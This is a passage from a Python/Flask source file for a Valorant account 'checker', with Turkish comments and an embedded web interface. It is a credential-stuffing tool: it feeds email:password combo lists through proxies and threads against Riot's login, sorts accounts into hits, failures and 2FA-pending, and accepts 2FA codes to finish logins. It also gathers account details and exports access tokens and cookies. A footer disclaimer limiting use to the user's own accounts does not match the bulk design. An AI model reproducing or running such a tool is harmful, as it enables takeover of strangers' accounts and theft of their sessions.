                       msg="Bu hesap icin bekleyen 2FA oturumu yok (sure dolmus olabilir)"), 404

    if JOB.mock:
        # mock: kod '123456' ise HIT
        if code == "123456":
            info = {
                "region": "eu", "game_name": "MockPlayer",
                "tag_line": _rs(4).upper(), "level": 42,
                "tier": "Diamond 2", "rr": 67, "wins": 130,
                "access_token": "mock_at_" + _rs(24),
                "entitlements": "mock_et_" + _rs(24),
                "puuid": "mock_" + _rs(32),
            }
            ck = "; ".join(f"mock_{k}={_rs(6)}" for k in ("ssid", "tdid", "asid"))
            JOB._record("HIT", email, "(mfa)", "mock_mfa_ok", ck, "mock://uri", info)
            JOB._dump_files()   # summary.json'u aninda guncelle
            return jsonify(ok=True, status="HIT")
        return jsonify(ok=False, error="invalid_code", msg="Mock kod: 123456")

    ok, uri, ck = complete_mfa(entry["sess"], code)
    if ok:
        # basarili 2FA -> HIT + enrich
        tag = "mfa_ok"
        info = None
        try:
            if JOB.enrich:
                info = enrich(entry["sess"], uri)
                tag = fmt_enrich(info, tag)
        except Exception:
            info = None
        JOB._record("HIT", email, "(mfa)", tag, ck, uri, info)
        JOB._dump_files()   # summary.json'u aninda guncelle
        return jsonify(ok=True, status="HIT", tag=tag)
    return jsonify(ok=False, error=uri or "mfa_failed", msg="Kod reddedildi")


@app.get("/api/download")
def api_download():
    kind = request.args.get("type", "hits")
    if kind == "json":
        # summary.json icerigini dondur
        lines = ""
        if JOB.out_dir:
            p = os.path.join(JOB.out_dir, "summary.json")
            if os.path.exists(p):
                with open(p, "r", encoding="utf-8") as f:
                    lines = f.read()
        ts = time.strftime("%Y%m%d_%H%M%S")
        return Response(
            lines,
            mimetype="application/json; charset=utf-8",
            headers={"Content-Disposition": f"attachment; filename=summary_{ts}.json"},
        )
    if kind not in ("hits", "fails", "tfa", "tokens", "all"):
        kind = "hits"
    lines = JOB.bufs.get(kind, [])
    ts = time.strftime("%Y%m%d_%H%M%S")
    return Response(
        "\n".join(lines) + ("\n" if lines else ""),
        mimetype="text/plain; charset=utf-8",
        headers={"Content-Disposition": f"attachment; filename=valorant_{kind}_{ts}.txt"},
    )


# ---------------------------------------------------------------- UI (embedded)
_HTML = r"""<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>VALORANT · RSO CHECKER v2</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Anton&family=Rajdhani:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#0f1923; --panel:#16212d; --panel2:#101823; --card:#1a2733;
  --line:#2c3b4a; --red:#ff4655; --red-dark:#c9313e; --white:#ece8e1;
  --muted:#7a8b99; --green:#46c88d; --purple:#b98bff; --yellow:#f2b01e; --gray:#8b98a5;
}
*{box-sizing:border-box; margin:0; padding:0;}
html,body{background:var(--bg); color:var(--white); font-family:'Rajdhani',sans-serif;}
.wrap{max-width:1280px; margin:0 auto; padding:28px 22px 40px;}

header{display:flex; align-items:flex-end; justify-content:space-between; gap:16px; flex-wrap:wrap; margin-bottom:22px;}
.brand .top{font-family:'Anton',sans-serif; font-size:34px; letter-spacing:4px; color:var(--red); line-height:1;}
.brand .top b{color:var(--white); font-weight:400;}
.brand .sub{font-size:12px; letter-spacing:4px; color:var(--muted); text-transform:uppercase; margin-top:6px;}
.brand .sub i{color:var(--red); font-style:normal;}
.badges{display:flex; gap:8px;}
.badge{
  display:flex; align-items:center; gap:7px; padding:7px 14px; font-weight:700; font-size:12px;
  letter-spacing:2px; background:var(--panel2); border:1px solid var(--line); color:var(--muted);
}
.badge .dot{width:8px; height:8px; border-radius:50%; background:var(--gray);}
.badge.run .dot{background:var(--green); box-shadow:0 0 8px var(--green); animation:pulse 1s infinite;}
.badge.idle .dot{background:var(--gray);}
.badge.mock .dot{background:var(--yellow);}
.badge.live .dot{background:var(--red);}
@keyframes pulse{50%{opacity:.35;}}

.stats{display:grid; grid-template-columns:repeat(7,1fr); gap:10px; margin-bottom:16px;}
@media(max-width:960px){.stats{grid-template-columns:repeat(4,1fr);}}
.stat{background:var(--panel); border:1px solid var(--line); clip-path:polygon(10px 0,100% 0,100% calc(100% - 10px),calc(100% - 10px) 100%,0 100%,0 10px); padding:10px 14px;}
.stat .k{font-size:10px; letter-spacing:3px; color:var(--muted); font-weight:700;}
.stat .v{font-family:'JetBrains Mono',monospace; font-size:22px; font-weight:600; margin-top:2px;}
.stat.hit .v{color:var(--green);} .stat.fail .v{color:var(--red);} .stat.tfa .v{color:var(--purple);}
.stat.retry .v{color:var(--yellow);} .stat.cpm .v{color:var(--white);} .stat.time .v{color:var(--muted); font-size:17px;}

.grid{display:grid; grid-template-columns:390px 1fr; gap:16px; align-items:start;}
@media(max-width:960px){.grid{grid-template-columns:1fr;}}

.panel{background:var(--panel); border:1px solid var(--line); clip-path:polygon(12px 0,100% 0,100% calc(100% - 12px),calc(100% - 12px) 100%,0 100%,0 12px); overflow:hidden;}
.panel .head{
  display:flex; align-items:center; justify-content:space-between; gap:8px;
  padding:10px 16px; background:var(--panel2); border-bottom:1px solid var(--line);
  font-weight:700; letter-spacing:3px; font-size:12px; text-transform:uppercase; color:var(--muted);
}
.panel .head b{color:var(--white); font-weight:700;}
.panel .body{padding:14px 16px;}

label{display:block; font-size:11px; letter-spacing:2px; font-weight:700; color:var(--muted); text-transform:uppercase; margin:14px 0 6px;}
label:first-child{margin-top:0;}
textarea{
  width:100%; min-height:150px; resize:vertical; background:var(--panel2); color:var(--white);
  border:1px solid var(--line); outline:none; font-family:'JetBrains Mono',monospace; font-size:12px;
  padding:10px; line-height:1.5; transition:border-color .15s;
}
textarea:focus{border-color:var(--red);}
textarea.small{min-height:64px;}
.row2{display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:10px;}
.row3{display:grid; grid-template-columns:1fr 1fr 1fr; gap:8px; margin-top:10px;}
.btn{
  font-family:'Rajdhani',sans-serif; font-weight:700; letter-spacing:2px; text-transform:uppercase;
  font-size:13px; padding:11px 14px; border:1px solid var(--line); background:var(--panel2);
  color:var(--white); cursor:pointer; transition:all .12s; text-align:center;
  clip-path:polygon(8px 0,100% 0,100% calc(100% - 8px),calc(100% - 8px) 100%,0 100%,0 8px);
}
.btn:hover{border-color:var(--red); color:var(--red);}
.btn:disabled{opacity:.4; cursor:not-allowed;}
.btn.primary{background:var(--red); border-color:var(--red); color:#fff;}
.btn.primary:hover{background:var(--red-dark); box-shadow:0 0 14px rgba(255,70,85,.45); color:#fff;}
.btn.ghost{background:transparent;}
.btn.block{width:100%;}
.btn.small{padding:6px 10px; font-size:11px;}
.chk{display:flex; align-items:center; gap:8px; margin-top:14px; font-size:13px; font-weight:600; color:var(--muted); cursor:pointer;}
.chk input{accent-color:var(--red); width:15px; height:15px;}
.filler{height:14px;}

/* mfa badge */
.mfabadge{
  display:inline-flex; align-items:center; gap:6px; margin-top:10px; padding:8px 12px;
  background:rgba(185,139,255,.12); border:1px solid rgba(185,139,255,.45); color:var(--purple);
  font-weight:700; font-size:12px; letter-spacing:1px; cursor:pointer; text-transform:uppercase;
}
.mfabadge:hover{background:rgba(185,139,255,.22);}

/* ---------- table ---------- */
.tabs{display:flex; gap:6px; margin-bottom:10px; flex-wrap:wrap;}
.tab{
  font-weight:700; font-size:11px; letter-spacing:2px; text-transform:uppercase;
  padding:6px 12px; background:var(--panel2); border:1px solid var(--line); color:var(--muted);
  cursor:pointer; clip-path:polygon(6px 0,100% 0,100% calc(100% - 6px),calc(100% - 6px) 100%,0 100%,0 6px);
}
.tab.active{color:#fff; border-color:var(--red); background:rgba(255,70,85,.15);}
.tab:hover{color:var(--white);}
.searchrow{display:flex; gap:6px; align-items:center; margin-bottom:10px;}
.searchrow input{
  flex:1; background:var(--panel2); border:1px solid var(--line); color:var(--white);
  padding:8px 12px; font-family:'JetBrains Mono',monospace; font-size:12px; outline:none;
}
.searchrow input:focus{border-color:var(--red);}
.dlrow{display:flex; gap:6px; flex-wrap:wrap; margin-bottom:10px;}
.dl{font-size:11px; padding:6px 12px;}

.tblwrap{max-height:520px; overflow-y:auto; background:var(--panel2); border:1px solid var(--line);}
.tblwrap table{width:100%; border-collapse:collapse; font-family:'JetBrains Mono',monospace; font-size:12px;}
.tblwrap th{
  position:sticky; top:0; background:#0b131c; text-align:left; padding:8px 12px;
  font-size:10px; letter-spacing:2px; color:var(--muted); text-transform:uppercase; border-bottom:1px solid var(--line);
}
.tblwrap td{padding:6px 12px; border-bottom:1px solid #1c2834; white-space:nowrap;}
.tblwrap tr:hover td{background:rgba(255,70,85,.05);}
.sb{
  display:inline-block; font-weight:700; font-size:10px; letter-spacing:1px; padding:2px 8px;
  clip-path:polygon(4px 0,100% 0,100% calc(100% - 4px),calc(100% - 4px) 100%,0 100%,0 4px);
}
.sb.HIT{background:rgba(70,200,141,.15); color:var(--green); border:1px solid rgba(70,200,141,.4);}
.sb.FAIL{background:rgba(255,70,85,.15); color:var(--red); border:1px solid rgba(255,70,85,.4);}
.sb.TFA{background:rgba(185,139,255,.15); color:var(--purple); border:1px solid rgba(185,139,255,.4);}
.sb.RETRY{background:rgba(242,176,30,.15); color:var(--yellow); border:1px solid rgba(242,176,30,.4);}
.acct{color:var(--white);} .tag{color:var(--muted); max-width:420px; overflow:hidden; text-overflow:ellipsis;}
.empty{padding:34px; text-align:center; color:var(--muted); font-size:14px; letter-spacing:1px;}

footer{margin-top:22px; text-align:center; color:var(--muted); font-size:12px; letter-spacing:1px;}
footer b{color:var(--red); font-weight:700;}

.toasts{position:fixed; bottom:18px; right:18px; z-index:99; display:flex; flex-direction:column; gap:8px;}
.toast{
  background:#1a2733; border:1px solid var(--line); border-left:3px solid var(--red);
  padding:10px 16px; font-weight:600; font-size:13px; max-width:340px;
  box-shadow:0 8px 24px rgba(0,0,0,.5); animation:slidein .18s ease-out;
}
.toast.ok{border-left-color:var(--green);} .toast.warn{border-left-color:var(--yellow);}
@keyframes slidein{from{transform:translateX(30px); opacity:0;} to{transform:none; opacity:1;}}
::-webkit-scrollbar{width:9px; height:9px;} ::-webkit-scrollbar-thumb{background:#2c3b4a;} ::-webkit-scrollbar-track{background:transparent;}

/* modal */
.overlay{
  position:fixed; inset:0; background:rgba(6,10,15,.82); z-index:50; display:none;
  align-items:center; justify-content:center;
}
.overlay.open{display:flex;}
.modal{
  background:var(--panel); border:1px solid var(--line); width:min(440px,92vw);
  clip-path:polygon(14px 0,100% 0,100% calc(100% - 14px),calc(100% - 14px) 100%,0 100%,0 14px);
}
.modal .head{padding:14px 18px; background:var(--panel2); border-bottom:1px solid var(--line);
  font-weight:700; letter-spacing:3px; text-transform:uppercase; font-size:13px; display:flex; justify-content:space-between;}
.modal .head .x{cursor:pointer; color:var(--muted); font-size:16px; line-height:1;}
.modal .head .x:hover{color:var(--red);}
.modal .body{padding:18px;}
.modal select,.modal input{
  width:100%; background:var(--panel2); border:1px solid var(--line); color:var(--white);
  padding:10px 12px; font-family:'JetBrains Mono',monospace; font-size:13px; outline:none; margin-bottom:12px;
}
.modal select:focus,.modal input:focus{border-color:var(--purple);}
</style>
</head>
<body>
<div class="wrap">

  <header>
    <div class="brand">
      <div class="top">VALORANT <b>RSO</b> CHECKER <span style="color:var(--muted);font-size:16px;">v2</span></div>
      <div class="sub">account validation <i>//</i> enrich + mfa + cli</div>
    </div>
    <div class="badges">
      <span class="badge" id="bState"><span class="dot"></span><span id="bStateTxt">IDLE</span></span>
      <span class="badge" id="bMode"><span class="dot"></span><span id="bModeTxt">LIVE</span></span>
      <span class="badge mock" id="bMfa"><span class="dot"></span><span id="bMfaTxt">2FA: 0</span></span>
    </div>
  </header>

  <div class="stats">
    <div class="stat total"><div class="k">TOPLAM</div><div class="v" id="sTotal">0</div></div>
    <div class="stat hit"><div class="k">HIT</div><div class="v" id="sHits">0</div></div>
    <div class="stat fail"><div class="k">FAIL</div><div class="v" id="sFails">0</div></div>
    <div class="stat tfa"><div class="k">2FA</div><div class="v" id="sTfa">0</div></div>
    <div class="stat retry"><div class="k">RETRY</div><div class="v" id="sRetry">0</div></div>
    <div class="stat cpm"><div class="k">CPM</div><div class="v" id="sCpm">0</div></div>
    <div class="stat time"><div class="k">SÜRE</div><div class="v" id="sTime">00:00:00</div></div>
  </div>

  <div class="grid">
    <!-- left: controls -->
    <div class="panel">
      <div class="head"><span><b>KONTROL</b> PANELİ</span><span id="hProg"></span></div>
      <div class="body">
        <label>COMBO LİSTESİ — email:password</label>
        <textarea id="combos" spellcheck="false" placeholder="ornek@mail.com:parola&#10;kullanici@x.com:12345"></textarea>
        <div class="row2">
          <label style="margin:0;">DOSYA</label>
          <label style="margin:0;">HIZLI ÖRNEK</label>
        </div>
        <div class="row2">
          <button class="btn ghost" onclick="pickFile('combos')">Dosya Yükle</button>
          <button class="btn ghost" onclick="loadSample()">Örnek Doldur</button>
        </div>
        <input type="file" id="fCombos" accept=".txt,.combo,.lst,.csv" hidden>

        <label>PROXY LİSTESİ — isteğe bağlı</label>
        <textarea id="proxies" class="small" spellcheck="false" placeholder="ip:port veya http://user:pass@ip:port"></textarea>
        <div class="row2">
          <button class="btn ghost" onclick="pickFile('proxies')">Dosya Yükle</button>
          <button class="btn ghost" onclick="document.getElementById('proxies').value=''">Temizle</button>
        </div>
        <input type="file" id="fProxies" accept=".txt,.lst" hidden>

        <div class="row3">
          <div>
            <label>THREAD</label>
            <textarea id="threads" class="small" style="min-height:42px;" spellcheck="false">10</textarea>
          </div>
          <div>
            <label>GECİKME ms</label>
            <textarea id="delay" class="small" style="min-height:42px;" spellcheck="false">30</textarea>
          </div>
          <div>
            <label>HIT DERİN</label>
            <label class="chk" style="margin-top:16px;"><input type="checkbox" id="enrichChk" checked> Enrich</label>
          </div>
        </div>

        <label class="chk"><input type="checkbox" id="mockChk"> Mock mod (Riot'a istek atmadan simülasyon)</label>

        <div class="mfabadge" id="btnMfa" onclick="openMfa()" style="display:none;">✦ 2FA KODU GİR (<span id="mfaCount">0</span>)</div>

        <div class="filler"></div>
        <div class="row2">
          <button class="btn primary block" id="btnStart" onclick="startJob()">▶ Başlat</button>
          <button class="btn block" id="btnStop" onclick="stopJob()" disabled>■ Durdur</button>
        </div>
      </div>
    </div>

    <!-- right: results -->
    <div class="panel">
      <div class="head"><span><b>SONUÇ</b> AKIŞI</span><span id="hOut"></span></div>
      <div class="body">
        <div class="tabs">
          <button class="tab active" data-f="all" onclick="setFilter(this)">Tümü</button>
          <button class="tab" data-f="HIT" onclick="setFilter(this)">HIT</button>
          <button class="tab" data-f="FAIL" onclick="setFilter(this)">FAIL</button>
          <button class="tab" data-f="TFA" onclick="setFilter(this)">2FA</button>
          <button class="tab" data-f="RETRY" onclick="setFilter(this)">RETRY</button>
        </div>
        <div class="searchrow">
          <input id="q" placeholder="Ara: email, tag, tier…" oninput="setFilter(document.querySelector('.tab.active'))">
        </div>
        <div class="dlrow">
          <button class="btn dl" onclick="download('all')">İndir: TÜMÜ</button>
          <button class="btn dl" onclick="download('hits')">İndir: HIT</button>
          <button class="btn dl" onclick="download('tfa')">İndir: 2FA</button>
          <button class="btn dl" onclick="download('tokens')">İndir: TOKEN</button>
          <button class="btn dl" onclick="download('json')">İndir: JSON</button>
          <button class="btn dl" onclick="copyHits()">Kopyala: HIT</button>
        </div>
        <div class="tblwrap">
          <table>
            <thead><tr><th>Saat</th><th>Durum</th><th>Hesap</th><th>Detay</th></tr></thead>
            <tbody id="rows"></tbody>
          </table>
          <div class="empty" id="empty">Henüz sonuç yok — combo yükleyip Başlat'a bas.</div>
        </div>
      </div>
    </div>
  </div>

  <footer>VALORANT RSO CHECKER v2 · yalnızca <b>kendi hesapların</b> veya yetkilendirilmiş test ortamı için · Riot Games ile bağlantılı değildir</footer>
</div>

<!-- MFA modal -->
<div class="overlay" id="mfaOverlay">
  <div class="modal">
    <div class="head"><span>2FA KODU GİR</span><span class="x" onclick="closeMfa()">✕</span></div>
    <div class="body">
      <label>HESAP</label>
      <select id="mfaEmail"></select>
      <label>DOĞRULAMA KODU</label>
      <input id="mfaCode" placeholder="6 haneli kod" maxlength="8" autocomplete="off">
      <button class="btn primary block" onclick="submitMfa()">Gönder</button>
    </div>
  </div>
</div>

<div class="toasts" id="toasts"></div>

<input type="file" id="fHidden" hidden>

<script>
var FILTER = 'all';
var STATE = null;

function toast(msg, cls){
  var t = document.createElement('div');
  t.className = 'toast ' + (cls || '');
  t.textContent = msg;
  document.getElementById('toasts').appendChild(t);
  setTimeout(function(){ t.remove(); }, 4000);
}

function pickFile(kind){
  var id = (kind === 'combos') ? 'fCombos' : 'fProxies';
  document.getElementById(id).click();
  document.getElementById(id).onchange = function(){
    var f = this.files[0]; if(!f) return;
    var r = new FileReader();
    r.onload = function(){ document.getElementById(kind).value = r.result; };
    r.readAsText(f);
  };
}

function loadSample(){
  document.getElementById('combos').value =
    'test.hit@example.com:123456\n' +
    'test.twofa@example.com:abcdef\n' +
    'test.fail@example.com:wrongpass\n' +
    'test.retry@example.com:000000\n' +
    'player.one@gmail.com:p4ssw0rd!\n' +
    'player.two@outlook.com:sifre123\n';
}

function linesOf(id){
  return document.getElementById(id).value.split(/\r?\n/).map(function(s){ return s.trim(); }).filter(Boolean);
}

function startJob(){
  var combos = linesOf('combos');
  var proxies = linesOf('proxies');
  var th = parseInt(document.getElementById('threads').value, 10) || 10;
  var dl = parseInt(document.getElementById('delay').value, 10) || 0;
  if(!combos.length){ toast('Combo listesi boş.', 'warn'); return; }
  fetch('/api/start', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      combos: combos, proxies: proxies, threads: th,
      delay: dl,
      enrich: document.getElementById('enrichChk').checked,
      mock: document.getElementById('mockChk').checked
    })
  }).then(function(r){ return r.json().then(function(d){ return {ok: r.ok, d: d}; }); })
    .then(function(x){
      if(x.ok){
        toast('Başlatıldı: ' + x.d.total + ' combo · ' + x.d.threads + ' thread · '
              + x.d.proxies + ' proxy · delay ' + x.d.delay + 'ms');
      } else {
        toast('Hata: ' + (x.d.msg || x.d.error), 'warn');
      }
    })
    .catch(function(){ toast('Sunucuya ulaşılamadı.', 'warn'); });
}

function stopJob(){
  fetch('/api/stop', {method: 'POST'}).then(function(){ toast('Durduruldu.'); });
}

function setFilter(el){
  document.querySelectorAll('.tab').forEach(function(b){ b.classList.remove('active'); });
  el.classList.add('active');
  FILTER = el.dataset.f;
  if(STATE) renderRows(STATE.recent || []);
}

function download(kind){
  window.location = '/api/download?type=' + kind;
}

function copyHits(){
  fetch('/api/download?type=hits').then(function(r){ return r.text(); }).then(function(t){
    if(!t.trim()){ toast('HIT yok.', 'warn'); return; }
    navigator.clipboard.writeText(t).then(function(){ toast('HIT listesi panoya kopyalandı (' + t.trim().split('\n').length + ' satır).', 'ok'); })
      .catch(function(){ toast('Pano erişimi yok.', 'warn'); });
  });
}

/* ---- MFA ---- */
function openMfa(){
  var sel = document.getElementById('mfaEmail');
  sel.innerHTML = '';
  var list = (STATE && STATE.mfa) || [];
  if(!list.length){ toast('Bekleyen 2FA hesabı yok.', 'warn'); return; }
  list.forEach(function(e){
    var o = document.createElement('option');
    o.value = e; o.textContent = e;
    sel.appendChild(o);
  });
  document.getElementById('mfaCode').value = '';
  document.getElementById('mfaOverlay').classList.add('open');
  setTimeout(function(){ document.getElementById('mfaCode').focus(); }, 60);
}
function closeMfa(){ document.getElementById('mfaOverlay').classList.remove('open'); }
function submitMfa(){
  var email = document.getElementById('mfaEmail').value;
  var code = document.getElementById('mfaCode').value.trim();
  if(!code){ toast('Kod gerekli.', 'warn'); return; }
  fetch('/api/mfa', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: email, code: code})
  }).then(function(r){ return r.json().then(function(d){ return {ok: r.ok, d: d}; }); })
    .then(function(x){
      if(x.ok){
        toast('2FA tamamlandı → HIT (' + (x.d.tag || '') + ')', 'ok');
        closeMfa();
      } else {
        toast('2FA reddedildi: ' + (x.d.msg || x.d.error), 'warn');
      }
    })
    .catch(function(){ toast('Sunucuya ulaşılamadı.', 'warn'); });
}

/* ---- render ---- */
function renderState(s){
  STATE = s;
  document.getElementById('sTotal').textContent = s.total;
  document.getElementById('sHits').textContent = s.hits;
  document.getElementById('sFails').textContent = s.fails;
  document.getElementById('sTfa').textContent = s.tfa;
  document.getElementById('sRetry').textContent = s.retry;
  document.getElementById('sCpm').textContent = s.cpm;
  document.getElementById('sTime').textContent = s.elapsed;
  document.getElementById('hOut').textContent = s.out_dir ? 'out: ' + s.out_dir : '';
  document.getElementById('hProg').textContent = s.total ? (s.done + ' / ' + s.total) : '';

  var bSt = document.getElementById('bState');
  bSt.className = 'badge ' + (s.running ? 'run' : 'idle');
  document.getElementById('bStateTxt').textContent = s.running ? 'ÇALIŞIYOR' : (s.done ? 'BİTTİ' : 'IDLE');

  var bM = document.getElementById('bMode');
  bM.className = 'badge ' + (s.mock ? 'mock' : 'live');
  document.getElementById('bModeTxt').textContent = s.mock ? 'MOCK' : 'LIVE';

  document.getElementById('btnStart').disabled = s.running;
  document.getElementById('btnStop').disabled = !s.running;

  var mfa = (s.mfa || []).length;
  document.getElementById('bMfaTxt').textContent = '2FA: ' + mfa;
  document.getElementById('mfaCount').textContent = mfa;
  document.getElementById('btnMfa').style.display = mfa ? '' : 'none';

  renderRows(s.recent || []);
}

function renderRows(rows){
  var body = document.getElementById('rows');
  var empty = document.getElementById('empty');
  var q = (document.getElementById('q').value || '').toLowerCase();
  var filtered = rows;
  if(FILTER !== 'all') filtered = filtered.filter(function(r){ return r.s === FILTER; });
  if(q) filtered = filtered.filter(function(r){
    return (r.a + ' ' + r.d).toLowerCase().indexOf(q) !== -1;
  });

  if(!filtered.length){
    body.innerHTML = '';
    empty.style.display = 'block';
    return;
  }
  empty.style.display = 'none';
  var html = '';
  filtered.forEach(function(r){
    var acc = r.a;
    if(acc.length > 46){ acc = acc.slice(0, 44) + '…'; }
    html += '<tr><td class="tag">' + r.t + '</td>' +
            '<td><span class="sb ' + r.s + '">' + r.s + '</span></td>' +
            '<td class="acct">' + esc(acc) + '</td>' +
            '<td class="tag" title="' + esc(r.d || '') + '">' + esc(r.d || '') + '</td></tr>';
  });
  body.innerHTML = html;
}

function esc(s){
  var d = document.createElement('div');
  d.textContent = s;
  return d.innerHTML;
}

function poll(){
  fetch('/api/state', {cache: 'no-store'})
    .then(function(r){ return r.json(); })
    .then(renderState)
    .catch(function(){});
}
setInterval(poll, 800);
poll();
</script>
</body>
</html>
"""

# ---------------------------------------------------------------- CLI
def run_cli(combos_path, proxies_path, threads, mock, delay, enrich):
    if not (proxies_path and os.path.exists(proxies_path)):
        proxies_path = None
    combos = []
    if not os.path.exists(combos_path):
        print(f"  [!] Dosya yok: {combos_path}")
        sys.exit(1)
    with open(combos_path, "r", encoding="utf-8", errors="replace") as f:
        combos = parse_combos(f.readlines())
    proxies = []
    if proxies_path:
        with open(proxies_path, "r", encoding="utf-8", errors="replace") as f:
            proxies = parse_proxies(f.readlines())
    if not combos:
        print("  [!] Gecerli combo bulunamadi (email:password)")
        sys.exit(1)

    JOB.start(combos, proxies, threads, mock, delay, enrich)
    print(f"  [*] basladi: {len(combos)} combo | {len(proxies)} proxy | "
          f"{threads} thread | {'MOCK' if mock else 'LIVE'}")
    try:
        while JOB.running:
            time.sleep(0.4)
    except KeyboardInterrupt:
        print("\n  [!] Ctrl+C -> durduruluyor...")
        JOB.stop()
        sys.exit(130)
    # sonuclari azar azar listele
    print(JOB.cli_summary_text())


# ---------------------------------------------------------------- own (tek hesap canl· dogrulama)
def _hibp_precheck(pwd):
    """Sifre ifsada mi? HIBP k-anonim range API — sifrenin tamami disari cikmaz.
    Doner: (count, ok)  ok=False -> sorgu basarisiz."""
    if not pwd:
        return 0, True
    sha1 = hashlib.sha1(pwd.encode("utf-8")).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]
    count = 0
    ok = True
    try:
        lib = _req if _REQ else None
        if not lib:
            return 0, False
        r = lib.get(f"https://api.pwnedpasswords.com/range/{prefix}",
                    timeout=8, headers={"User-Agent": "riot-rso-checker/2.0",
                                        "Add-Padding": "true"})
        r.raise_for_status()
        for line in r.text.splitlines():
            s, _, cnt = line.partition(":")
            if s.strip() == suffix:
                count = int(cnt)
                break
    except Exception:
        ok = False
    return count, ok


def run_own(spec, mock=False):
    """Tek hesap icin canl· RSO dogrulama + enrich.
    Sadece kendi hesabin icin tasarlandi: token/cookie diske yazilmaz,
    konsol ciktisi + sanitize rapor uretilir."""
    spec = (spec or "").strip()
    if not spec:
        print("  [!] --own icin email[:password] ver:  python valorant_checker_v2.py --own hesap@mail.com:Sifre123")
        sys.exit(1)
    if ":" in spec:
        email, pwd = spec.split(":", 1)
        email, pwd = email.strip(), pwd.strip()
    else:
        email = spec.strip()
        import getpass
        pwd = getpass.getpass(f"  [*] {email} icin sifre: ")
    if "@" not in email or not pwd:
        print("  [!] Gecersiz hesap biçimi")
        sys.exit(1)

    print(f"  [*] canli dogrulama: {email}")
    print(f"  [*] client version : {_CVER}")

    # 1) HIBP on kontrol — sifren kendini ifsa etmis mi?
    cnt, ok = _hibp_precheck(pwd)
    if ok:
        if cnt > 0:
            print(f"  [!] UYARI: bu sifre HIBP ifsa verisinde {cnt} kez görunuyor."
                  f" (Yine de devam ediliyor; öneri: sifreyi degistir.)")
        else:
            print(f"  [*] HIBP: sifre bilinen ifsa verisinde yok.")

    ts = time.strftime("%Y%m%d_%H%M%S")

    # 2) RSO login
    if mock:
        st, tag, ck, tok, info = mock_check(email, pwd)
        sess = None
    else:
        st, tag, ck, tok, sess = riot_check(email, pwd)
        info = None
    print(f"  [*] durum: {st} ({tag})")

    # 3) 2FA -> interaktif kod
    if st == "2FA" and sess is not None:
        import getpass
        for attempt in range(3):
            code = getpass.getpass(f"  [?] 2FA kodu (deneme {attempt+1}/3): ")
            ok2, uri2, ck2 = complete_mfa(sess, code)
            if ok2:
                print(f"  [*] 2FA tamamlandı")
                st, tok = "HIT", uri2
                ck = ck2
                break
            print(f"  [!] kod reddedildi: {uri2 or 'bilinmeyen hata'}")
        else:
            print("  [!] 2FA tamamlanamadi")
            sys.exit(3)

    # 4) HIT -> enrich
    if st == "HIT":
        if not mock and sess is not None and tok:
            info = enrich(sess, tok)
            tag = fmt_enrich(info, tag)
        elif mock and info:
            tag = fmt_enrich(info, tag)
        print(f"\n{'='*60}")
        print(f"  HIT  {email}")
        print(f"  {tag}")
        if info:
            for k in ("region", "game_name", "tag_line", "level", "tier", "rr", "wins", "puuid"):
                if info.get(k) not in (None, "", 0):
                    print(f"    {k:<10}: {info[k]}")
        print(f"{'='*60}\n")
        # 5) sanitize rapor: token/cookie/sifre YOK
        out_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               f"out_riot_own_{ts}")
        os.makedirs(out_dir, exist_ok=True)
        safe = {"status": "HIT", "email": email, "checked_at": time.strftime("%Y-%m-%dT%H:%M:%S%z")}
        if info:
            safe["account"] = {k: info.get(k) for k in
                                ("game_name", "tag_line", "region", "level",
                                 "tier", "rr", "wins", "puuid") if info.get(k)}
        with open(os.path.join(out_dir, "own_report.json"), "w", encoding="utf-8") as f:
            json.dump(safe, f, ensure_ascii=False, indent=2)
        print(f"  [*] rapor: {os.path.join(out_dir, 'own_report.json')}")
    else:
        print(f"  [!] Giris basarisiz: {tag}")
        sys.exit(2)


# ---------------------------------------------------------------- main
def _parse_argv(argv):
    args = {
        "cli": False, "combos_path": None, "proxies_path": None,
        "threads": 10, "port": 5000, "mock": _MOCK,
        "delay": 30, "enrich": True, "own": None,
        "cver": "",
    }
    rest = []
    i = 0
    while i < len(argv):
        a = argv[i]
        if a == "--cli":
            args["cli"] = True
        elif a == "--mock":
            args["mock"] = True
        elif a == "--no-enrich":
            args["enrich"] = False
        elif a == "--own":
            args["own"] = True
        elif a == "--cver":
            if i + 1 < len(argv):
                args["cver"] = argv[i + 1]
                i += 1
        elif a.startswith("--cver="):
            args["cver"] = a.partition("=")[2]
        elif a in ("--port", "--threads", "--delay"):
            if i + 1 < len(argv):
                try:
                    args[a[2:]] = int(argv[i + 1])
                except ValueError:
                    pass
                i += 1
        elif a.startswith("--threads=") or a.startswith("--delay=") or a.startswith("--port="):
            key, _, val = a[2:].partition("=")
            try:
                args[key] = int(val)
            except ValueError:
                pass
        else:
            rest.append(a)
        i += 1
    # --own'da ilk pozisyonel -> email[:password]
    if args["own"]:
        if rest:
            args["own_spec"] = rest.pop(0)
    # --cli'de ilk pozisyonel -> combos, ikinci -> proxies
    if args["cli"]:
        if rest:
            args["combos_path"] = rest.pop(0)
        if rest:
            args["proxies_path"] = rest.pop(0)
    return args


def main():
    global _CVER
    print(_BANNER)
    args = _parse_argv(sys.argv[1:])
    args.setdefault("own_spec", None)
    args["threads"] = max(1, min(64, args["threads"]))
    args["delay"] = max(0, min(2000, args["delay"]))

    # client version: --cver > env > otomatik fetch
    if args.get("cver"):
        _CVER = args["cver"]
    elif not args.get("mock"):
        _fetch_cver()

    if args.get("own"):
        run_own(args["own_spec"], mock=bool(args.get("mock")))
        return

    if args["cli"]:
        if not args["combos_path"]:
            print("  Kullanim: python valorant_checker_v2.py --cli combos.txt [proxies.txt]"
                  " [--threads N] [--delay MS] [--mock] [--no-enrich]")
            sys.exit(1)
        run_cli(args["combos_path"], args["proxies_path"], args["threads"],
                args["mock"], args["delay"], args["enrich"])
        return

    # ---- web modu
    if not _FLASK:
        print("  [!] Flask yok — kur:  pip install flask requests curl-cffi")
        sys.exit(1)
    if not (_CURL or _REQ):
